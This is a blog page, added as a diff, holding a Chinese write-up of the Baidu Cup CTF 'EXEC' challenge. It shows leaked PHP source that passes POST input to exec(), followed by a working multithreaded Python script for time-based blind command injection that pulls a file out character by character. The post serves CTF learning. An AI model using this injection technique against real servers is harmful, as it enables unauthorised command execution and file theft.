@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言这道题本来要用bash反弹shell的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。 分析打开链接题目提示no sign。查看源代码发现这一行1&amp;lt;meta language=&apos;utf-8&apos; editor=&apos;vim&apos;&amp;gt; 于是就想到了vim信息泄露，于是访问.index.php.swp成功下载了源代码1234567891011121314151617181">
+<meta name="keywords" content="WEB,SKR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="百度杯CTF比赛 十月场-EXEC">
+<meta property="og:url" content="http://yoursite.com/2018/02/13/百度杯CTF比赛 十月场-EXEC/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言这道题本来要用bash反弹shell的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。 分析打开链接题目提示no sign。查看源代码发现这一行1&amp;lt;meta language=&apos;utf-8&apos; editor=&apos;vim&apos;&amp;gt; 于是就想到了vim信息泄露，于是访问.index.php.swp成功下载了源代码1234567891011121314151617181">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:22:19.966Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="百度杯CTF比赛 十月场-EXEC">
+<meta name="twitter:description" content="前言这道题本来要用bash反弹shell的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。 分析打开链接题目提示no sign。查看源代码发现这一行1&amp;lt;meta language=&apos;utf-8&apos; editor=&apos;vim&apos;&amp;gt; 于是就想到了vim信息泄露，于是访问.index.php.swp成功下载了源代码1234567891011121314151617181">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/13/百度杯CTF比赛 十月场-EXEC/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>百度杯CTF比赛 十月场-EXEC | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/13/百度杯CTF比赛 十月场-EXEC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">百度杯CTF比赛 十月场-EXEC
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-02-13 20:48:00" itemprop="dateCreated datePublished" datetime="2018-02-13T20:48:00+08:00">2018-02-13</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:22:19" itemprop="dateModified" datetime="2018-08-04T15:22:19+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题本来要用<code>bash反弹shell</code>的技术的，但是由于没有公网ip的服务器，我就用了命令盲注的方法，特此记录一下。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>打开链接题目提示<code>no sign</code>。查看源代码发现这一行<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">language</span>=<span class="string">'utf-8'</span> <span class="attr">editor</span>=<span class="string">'vim'</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>于是就想到了<code>vim信息泄露</code>，于是访问<code>.index.php.swp</code>成功下载了源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;   </span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">	setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">		$command=$_POST[cmd];</span><br><span class="line">		$result=exec($command);</span><br><span class="line">		<span class="comment">//echo $result;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'no sign'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>分析源码，发现可以执行命令，但是没有回显。最先想到的就是bash反弹shell来执行命令，此外题目提示<code>tcp tunnel is forbidden!</code>，就只能反弹到udp的端口了。但是我没有公网ip的服务器咋办啊，于是联想到以前做过的sql盲注这次我来个命令盲注。<br>页面没有回显，就只能做基于时间的盲注了，脚本总的来说很简单，使用了多线程，下面贴出exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string,threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">        data[<span class="string">'cmd'</span>]=<span class="string">"a=$(%s);b=$&#123;#a&#125;;if test $b -eq %d;then sleep 3;fi"</span>%(payload,i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            length = i</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the string length is &#123;&#125;"</span>.format(length)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getString</span><span class="params">(url,payload)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length,lock,curId,key</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    words = string.uppercase+string.lowercase+string.digits+<span class="string">'/=+'</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="keyword">if</span> curId == length:</span><br><span class="line">            lock.release()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = curId</span><br><span class="line">        curId += <span class="number">1</span></span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> words:</span><br><span class="line">            data[<span class="string">'cmd'</span>]=<span class="string">"a=$(&#123;&#125;);b=`expr substr $a &#123;&#125; 1`;if test $b = '&#123;&#125;';then sleep 8;fi"</span>.format(payload,i+<span class="number">1</span>,j)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.post(url,data=data,timeout=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                key[i] = j</span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="keyword">print</span> <span class="string">''</span>.join(key)</span><br><span class="line">                lock.release()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://708ff2d40f1d48a5bef9408daed3fa0665c6180098394883.game.ichunqiu.com/?sign=0xabcdef'</span></span><br><span class="line">payload = <span class="string">"base64 flag233.php -w 0"</span> </span><br><span class="line">length = getLength(url,payload)</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">curId = <span class="number">0</span> <span class="comment">#max(curId) = length - 1</span></span><br><span class="line">key = [<span class="string">'?'</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(length)]</span><br><span class="line"></span><br><span class="line">th=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=getString,args=(url,payload))</span><br><span class="line">    th.append(t)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">    t.start()  </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是，题目使用的shell是<code>sh</code>（<code>dash</code>和<code>bash</code>的区别<a href="http://ju.outofmemory.cn/entry/135" target="_blank" rel="noopener">看这个</a>），所以在字串截取时不能使用<code>bash</code>的<code>${a:1:1}</code>的方式。还有就是在使用<code>expr substr</code>进行子串截取时目标字符串需要是单行的否则会出错，可以配合<code>head</code>和<code>tail</code>命令一行一行读取。这里我使用了<code>base64</code>命令将命令结果编码，防止换行或特殊字符干扰。注意要使用<code>base64 -w 0</code>关闭换行。<br>最后运行代码获得flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo PD9waHAKCSRmbGFnPSdmbGFne2ExMWM4MjI3LWMyNGItNDAyNC1hMDRhLTdiOGIxOTYxZGM1ZH0nOwo/PgpoaGhoaGhoaGhoaCx0b28geW91bmcgdG9vIHNpbXBsZQo= | base64 -d</span></span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="variable">$flag</span>=<span class="string">'flag&#123;a11c8227-c24b-4024-a04a-7b8b1961dc5d&#125;'</span>;</span><br><span class="line">?&gt;</span><br><span class="line">hhhhhhhhhhh,too young too simple</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>还需要注意的是，由于题目平台资源限制，使用多线程会导致平台反应过慢从而导致盲注的正确性降低。可以通过减少线程或是增大<code>sleep</code>的时间来增加正确率。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>算是另辟蹊径了，而且在写代码的时候学到了很多。原来不熟悉，不理解的命令用法更清楚了。但是还要注意的是，时间盲注在注入时间较长时就容易造成误差，有的字节会出错，反正再有别的解决方法时时间盲注不是优先选择的方法。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WEB/" rel="tag"># WEB</a>
+          
+            <a href="/tags/SKR/" rel="tag"># SKR</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/13/pwnable.kr-memcpy/" rel="next" title="pwnable.kr-memcpy">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-memcpy
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/14/pwnable.kr-asm/" rel="prev" title="pwnable.kr-asm">
+                pwnable.kr-asm <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
